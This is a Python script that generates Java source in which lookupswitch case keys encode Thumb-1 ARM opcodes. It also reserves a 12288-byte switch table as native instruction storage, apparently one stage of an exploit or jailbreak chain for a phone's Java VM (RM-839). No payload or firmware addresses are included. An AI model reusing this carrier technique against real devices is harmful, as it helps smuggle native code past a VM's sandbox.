#!/usr/bin/env python3
# SPDX-License-Identifier: MIT
"""Shared four-literal carrier, derived from the tested RM-839 OS probe.

Generates bytecode geometry only; no firmware input or address table.
The 114-byte lookupswitch body carries Thumb-1 opcodes in sorted signed Java
keys. Literal offsets 40/48/56/64 and entry +13 are coupled to the session.
Changing compilers, opcode encodings or CPU/VM ABI requires validating the
packaged class bytes, not just this generator's output. See the porting guide.
Also emits an 12304-byte method with an 12288-byte table reserved for temporary
native instructions. The Java object heap is not executable on every platform.
"""

import json
import re
import sys
from pathlib import Path

ENTRIES = [
    (0x4280, 8),
    (0x4790, 6),
    (0x4798, 9),
    (0x4800, 7),
    (0x4900, 5),
    (0x4A00, 1),
    (0x4B00, 2),
    (0x1C04, 4),
    (0xB510, 3),
    (0xBD10, None),
]


def build():
    words = []
    keys = []
    for i, (opcode, dest) in enumerate(ENTRIES):
        delta = 0 if dest is None else (12 + 8 * dest - (12 + 8 * i + 6)) // 2
        assert -1024 <= delta <= 1023
        word = opcode | ((0 if dest is None else 0xE000 | (delta & 2047)) << 16)
        key = int.from_bytes(word.to_bytes(4, "little"), "big", signed=True)
        words.append(word)
        keys.append(key)
    assert keys == sorted(set(keys))
    return words, keys


def main():
    template, dest, layout = map(Path, sys.argv[1:])
    words, keys = build()
    text = template.read_text()
    text = re.sub(
        r"(?m)^[ \t]*// @CARRIER_CASES@$",
        "\n".join(f"            case {k}: return 0;" for k in keys),
        text,
    )
    text = re.sub(
        r"(?m)^[ \t]*// @EXPECTED_CARRIER_WORDS@$",
        "\n".join(f"            if(index=={i})return 0x{w:08X};" for i, w in enumerate(words)),
        text,
    )
    # One shared return target keeps the table exactly 12288 bytes, with a
    # 12-byte switch header and four return bytes: 12304 bytes total. Sparse
    # keys force lookupswitch; these bytes become temporary native storage.
    text = text.replace(
        "            // @PAYLOAD_SPACE_CASES@",
        "\n".join(f"            case {i << 16}:" for i in range(1, 1537))
        + "\n                return 0;",
    )
    assert "@CARRIER" not in text and "@EXPECTED" not in text and "@PAYLOAD" not in text
    dest.write_text(text)
    layout.write_text(
        json.dumps({"words": words, "keys": keys, "literals": [40, 48, 56, 64]}, indent=2) + "\n"
    )


if __name__ == "__main__":
    main()
